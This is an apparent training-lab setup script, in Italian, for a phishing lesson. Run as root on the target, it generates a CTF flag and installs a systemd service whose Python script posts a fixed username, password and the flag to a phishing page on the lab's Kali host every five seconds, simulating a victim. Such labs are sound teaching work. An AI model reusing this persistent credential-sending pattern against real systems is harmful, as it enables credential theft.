#!/usr/bin/env bash
# Lezione 29 · lato bersaglio · il finto utente "abbocca" al phishing.
# Ogni pochi secondi invia le sue credenziali alla pagina civetta sulla Kali
# (10.10.10.5:8080). Idempotente. Sul BERSAGLIO.
set -euo pipefail

if [ "$(id -u)" -ne 0 ]; then
  echo "[!] Va eseguito come root. Sul bersaglio lancia:  lab 29"; exit 1
fi
echo "== Lezione 29 (bersaglio) · vittima che abbocca al phishing =="

DIR=/opt/lab/lab29
mkdir -p "$DIR"
[ -f "$DIR/flags.env" ] || {
  r() { head -c 3 /dev/urandom | od -An -tx1 | tr -d ' \n'; }
  echo "FLAG_PHISH=FLAG{phishing_catturato_$(r)}" > "$DIR/flags.env"
  chmod 600 "$DIR/flags.env"
}
FLAG_PHISH="$(grep '^FLAG_PHISH=' "$DIR/flags.env" | cut -d= -f2-)"

cat > "$DIR/vittima.py" <<PY
#!/usr/bin/env python3
# La vittima: crede che sia il sito vero e invia le credenziali alla pagina
# civetta sulla Kali (10.10.10.5:8080). Solo stdlib.
import time, urllib.request, urllib.parse
PHISH = "http://10.10.10.5:8080/login"
DATI = urllib.parse.urlencode({
    "utente": "vittima",
    "password": "Pesc3Rosso!",
    "nota": "${FLAG_PHISH}",
}).encode()
while True:
    try:
        urllib.request.urlopen(PHISH, data=DATI, timeout=3)
    except Exception:
        pass
    time.sleep(5)
PY
chmod 755 "$DIR/vittima.py"

cat > /etc/systemd/system/lab29-vittima.service <<'EOF'
[Unit]
Description=Lab29 vittima che abbocca al phishing
After=network.target
[Service]
ExecStart=/usr/bin/python3 /opt/lab/lab29/vittima.py
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable --now lab29-vittima.service >/dev/null 2>&1 || true
systemctl restart lab29-vittima.service >/dev/null 2>&1 || true

sleep 1
systemctl is-active --quiet lab29-vittima.service \
  && echo "[OK] La vittima invia le credenziali a 10.10.10.5:8080 ogni 5s." \
  || echo "[!] Vittima non attiva. Controlla: systemctl status lab29-vittima"
echo "     Flag (docente):  sudo cat $DIR/flags.env"
